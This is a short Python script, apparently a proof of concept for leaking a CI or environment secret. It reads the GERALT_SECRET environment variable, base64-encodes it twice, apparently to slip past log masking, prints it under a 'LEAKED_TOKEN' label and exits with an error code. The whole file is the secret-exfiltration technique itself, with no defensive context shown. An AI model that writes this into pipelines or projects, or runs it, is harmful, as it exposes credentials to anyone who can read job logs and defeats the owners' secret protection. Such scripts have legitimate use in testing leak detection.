import base64
import os
import sys

secret = os.environ.get("GERALT_SECRET", "")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode())
sys.exit(1)
